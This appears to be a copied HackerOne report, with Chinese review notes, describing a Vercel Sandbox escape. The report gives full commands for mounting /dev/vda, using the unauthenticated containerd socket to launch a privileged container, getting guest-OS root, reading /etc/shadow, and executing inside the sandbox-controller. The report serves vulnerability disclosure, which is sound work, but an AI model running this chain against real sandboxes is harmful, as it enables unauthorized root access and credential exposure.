# H1 Report #3972961 — Vercel Sandbox escape via unauthenticated containerd socket (guest-OS root)

> 状态: **Not Applicable**(官方判定,19 hours ago)
> 提交: 2026-08-27(1 day ago) | 关闭: 2026-08-28(19 hours ago)
> 官方:链式原语均已知,接管局限于 attacked microVM,无 material new impact

## Report (原文)

### Summary
A sandboxed user process mounts the microVM guest disk (/dev/vda) and reaches the unauthenticated containerd socket of the guest OS (/run/containerd/containerd.sock — no auth plugin, no policy layer). Using the guest's own ctr CLI we create an arbitrary privileged container (ctr run --rootfs --privileged, guest root rbind-mounted) and get full root on the guest OS (chroot /host, CapEff all 60). We also run code inside the running sandbox-controller container (ctr tasks exec + overlay upperdir injection, uid=0) and read its live env (AWS instance ID, hive metadata). This is a container-runtime takeover of the platform's management OS — a new root cause (unauthenticated runtime socket) beyond the known "read guest disk" finding.

### Steps To Reproduce
All commands run inside the sandbox (one sandbox, <5 min, ~15 MB writes):

1. **Mount the guest disk**
   ```python
   python3 -c "import ctypes,os; libc=ctypes.CDLL(None,use_errno=True); os.makedirs('/mnt/vda',exist_ok=True); print(libc.mount(b'/dev/vda',b'/mnt/vda',b'xfs',0,None), ctypes.get_errno())"
   ```
   → 0 0; /mnt/vda/run/containerd/containerd.sock visible.

2. **Confirm unauthenticated containerd**
   ```
   /mnt/vda/usr/bin/ctr --address /mnt/vda/run/containerd/containerd.sock tasks list
   ```
   → containerd v2.2.5; tasks list shows the RUNNING sandbox-controller; containers info <id> dumps its full spec/env (ECR image, DD_TAGS=ec2_host:i-..., VERCEL_HIVE_INSTANCE_TYPE=r6id.metal, 44 caps). No authentication anywhere.

3. **Path alignment + rootfs injection**
   ```
   mkdir -p /var/lib/containerd /run/containerd
   mount --bind /mnt/vda/var/lib/containerd /var/lib/containerd
   mount --bind /mnt/vda/run/containerd /run/containerd
   curl -sL -m 90 -o /tmp/a.tgz https://dl-cdn.alpinelinux.org/alpine/v3.20/releases/x86_64/alpine-minirootfs-3.20.3-x86_64.tar.gz
   mkdir -p /mnt/vda/pwnrootfs && tar -xzf /tmp/a.tgz -C /mnt/vda/pwnrootfs
   ```

4. **Create privileged container with guest root rbind-mounted; chroot = guest-OS root**
   ```
   /mnt/vda/usr/bin/ctr --address /mnt/vda/run/containerd/containerd.sock \
     run --rm --rootfs --privileged --mount=type=bind,src=/,dst=/host,options=rbind:rw \
     /pwnrootfs pwn /bin/sh -c 'chroot /host /bin/sh -c "id; grep CapEff /proc/self/status; head -3 /etc/shadow"'
   ```
   → uid=0(root), CapEff: 000001ffffffffff, /etc/shadow readable.

5. **Exec inside the running sandbox-controller** (busybox injected into the overlay snapshot layers, then:)
   ```
   /mnt/vda/usr/bin/ctr --address /mnt/vda/run/containerd/containerd.sock \
     tasks exec --exec-id ex1 <sandbox-controller-id> /bin/sh /epay.sh
   ```
   → arbitrary commands as uid=0 inside the platform control-plane container (live env, mount tree, /proc/1/cmdline=/opt/vercel/sandboxctrl).

Cleanup: --rm containers; remove /mnt/vda/pwnrootfs and injected files.

### Impact
- Runtime takeover of the guest-OS container runtime (unauthenticated): arbitrary container create/run/exec/delete incl. privileged.
- Guest-OS root from a sandboxed process: read/write the whole guest disk, all 60 capabilities (CAP_SYS_ADMIN/NET_ADMIN/MODULE/PTRACE).
- Platform credentials/metadata: sandbox-controller env (AWS instance ID, hive realm/cell), guest /etc/shadow, guest CA material.
- Upgrade paths: modify guest network stack (gateway of the microVM), load kernel modules, ptrace celld/containerd/runc, intercept the :23456 control channel — building blocks toward the EC2 host / cross-tenant hop.
- Scope (verified): per-sandbox dedicated microVM; takeover contained to the attacked VM. vsock/host channel probed — no open host ports.

### Root cause
- Sandbox exposes /dev/vda and allows mount(2) (known finding; entry point only).
- Guest-OS containerd socket is unauthenticated — no auth plugin, no policy; sandbox can reach it via the mounted disk and act as a root client.
- containerd run --rootfs --privileged / tasks exec unrestricted (no admission policy).

### Suggested fix
- Authenticate/authorize the containerd socket; block --privileged/--rootfs/tasks exec for non-platform clients.
- Do not place the runtime socket/control plane on the disk exposed to sandboxes; mask /run/containerd, /run/cell, /var/lib/containerd, /usr/bin/ctr.
- Remove the entry point: device-cgroup-deny block devices + deny mount(2)/mknod(2) in seccomp.

### Verification (fresh sandboxes, 2026-08-27)
8 consecutive full-chain reproductions, all PASS (different nodes/hives each time): vda mount → unauthenticated containerd 2.2.5 → privileged container → chroot guest-OS root → persistent write read back by a 2nd container → exec into sandbox-controller as uid=0 → clean.

| Test | Result |
|---|---|
| Full chain → guest-OS root (CapEff all 60) | PASS |
| sandbox-controller spec/env disclosure | PASS |
| Cross-tenant (2 parallel sandboxes) | NOT SHARED (per-microVM) |
| vsock / host channel probe | CLOSED (no open host ports) |
| Exec into running sandbox-controller | PASS (uid=0, seccomp doesn't block) |
| Guest-OS persistent write (VM lifetime) | PASS |

### Attachments
- F6562347: Vercel-sandbox-containerd-control-plane-poc.zip

## Timeline · 官方回复

### vercel-triage — comment (19 hours ago)
> Thank you for your report. We have started our analysis and aim to triage it within 5 business days of submission; in all cases we will get back to you before October 1, 2026, when our triage window ends (see Response targets in the program policy). If we need more information to reproduce your finding, we will ask on this report.

### Vercel Sandbox — closed the report, status → Not Applicable (19 hours ago)
> Thank you for the detailed report and the working PoC. We are closing this as Not Applicable per the program policy's Known findings section: the primitives this chains are already documented as known, specifically the container-to-guest-OS namespace escape (mknod + mount of the microVM system disk /dev/vda) and the post-escape host-side surface (the guest's containerd.sock, ipc.sock, and APM/metrics sockets being world-accessible from the escaped context). Reports duplicating these root causes are not eligible unless they demonstrate a materially new impact: a new escape path to the EC2 host, cross-tenant reach, or a previously-unknown host write primitive. Your own verification confirms the takeover is contained to the attacked microVM (the host channel showed no open ports, and the dual-sandbox test showed no sharing), so no such new impact is demonstrated here. If you can chain one of these known primitives into a demonstrated host-level or cross-tenant impact on a live sandbox, that new impact would be eligible at its own severity tier.

## 判定要点(供复盘)

- **官方确认 Known findings 覆盖**:容器→guest-OS namespace 逃逸(mknod+mount vda)+ 逃逸后 guest 的 containerd.sock / ipc.sock / APM/metrics socket 世界可访问——**都已在清单**
- **合格标准重申**:material new impact = EC2 host 新逃逸路径 / 跨租户可达 / 先前未知的 host 写原语
- **报告者自证负面证据被官方引用**:host channel CLOSED + 双沙箱 NOT SHARED → 官方据此确认无新影响("Your own verification confirms...")
- 官方再次邀请:链成 host-level / cross-tenant 影响 → 按自身严重级别计酬
